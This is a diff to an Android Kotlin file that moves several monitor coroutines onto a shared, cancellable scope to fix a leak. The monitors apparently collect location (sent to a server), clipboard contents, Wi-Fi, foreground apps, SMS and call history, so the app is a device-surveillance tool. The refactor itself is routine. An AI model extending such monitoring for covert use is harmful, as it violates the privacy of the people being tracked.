@@ -20,6 +20,8 @@ import com.abuzahra.manager.service.MyAccessibilityService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
@@ -69,6 +71,17 @@ object MonitorExecutor {
     private var appMonitorJob: Job? = null
     private var smsMonitorJob: Job? = null
     private var callMonitorJob: Job? = null
+
+    // ===== MONITOR SCOPE =====
+    // Single shared scope for all monitor coroutines. Previously each monitor
+    // spawned its own CoroutineScope(Dispatchers.IO) that was never cancelled,
+    // leaking forever (even after the corresponding stop() method cancelled the
+    // individual Job, the scope's parent SupervisorJob and dispatcher state
+    // remained alive). Using one shared scope lets cleanup() cancel everything
+    // at once. The scope is cancelled and recreated in cleanup() so monitoring
+    // can be restarted afterwards.
+    @Volatile
+    private var monitorScope: CoroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     
     // ===== LOCATION LISTENER =====
     private var locationListener: LocationListener? = null
@@ -264,8 +277,8 @@ object MonitorExecutor {
                 // Check geofences
                 checkGeofences(location.latitude, location.longitude, context)
                 
-                // Send to server
-                CoroutineScope(Dispatchers.IO).launch {
+                // Send to server (uses shared monitorScope so cleanup() can cancel it)
+                monitorScope.launch {
                     try {
                         ApiClient.sendLocation(
                             context,
@@ -543,7 +556,7 @@ object MonitorExecutor {
         
         clipboardMonitorActive = true
         
-        clipboardJob = CoroutineScope(Dispatchers.IO).launch {
+        clipboardJob = monitorScope.launch {
             var lastClipboard = ""
             
             while (isActive && clipboardMonitorActive) {
@@ -620,7 +633,7 @@ object MonitorExecutor {
         
         wifiMonitorActive = true
         
-        wifiJob = CoroutineScope(Dispatchers.IO).launch {
+        wifiJob = monitorScope.launch {
             var lastWifi = ""
             
             while (isActive && wifiMonitorActive) {
@@ -676,7 +689,7 @@ object MonitorExecutor {
         
         appMonitorActive = true
         
-        appMonitorJob = CoroutineScope(Dispatchers.IO).launch {
+        appMonitorJob = monitorScope.launch {
             var lastApp = ""
             
             while (isActive && appMonitorActive) {
@@ -762,7 +775,7 @@ object MonitorExecutor {
         
         smsMonitorActive = true
         
-        smsMonitorJob = CoroutineScope(Dispatchers.IO).launch {
+        smsMonitorJob = monitorScope.launch {
             var lastSmsId = 0L
             
             while (isActive && smsMonitorActive) {
@@ -833,7 +846,7 @@ object MonitorExecutor {
         
         callMonitorActive = true
         
-        callMonitorJob = CoroutineScope(Dispatchers.IO).launch {
+        callMonitorJob = monitorScope.launch {
             var lastCallId = 0L
             
             while (isActive && callMonitorActive) {
@@ -1014,6 +1027,20 @@ object MonitorExecutor {
         appMonitorJob?.cancel()
         smsMonitorJob?.cancel()
         callMonitorJob?.cancel()
+        
+        locationJob = null
+        clipboardJob = null
+        wifiJob = null
+        appMonitorJob = null
+        smsMonitorJob = null
+        callMonitorJob = null
+        
+        // Cancel the shared monitor scope to release any lingering child
+        // coroutines (e.g. fire-and-forget sendLocation launches from the
+        // location listener that are not tracked in a Job field), then
+        // recreate it so monitoring can be started again afterwards.
+        monitorScope.cancel()
+        monitorScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
         
         locationListener = null
     }
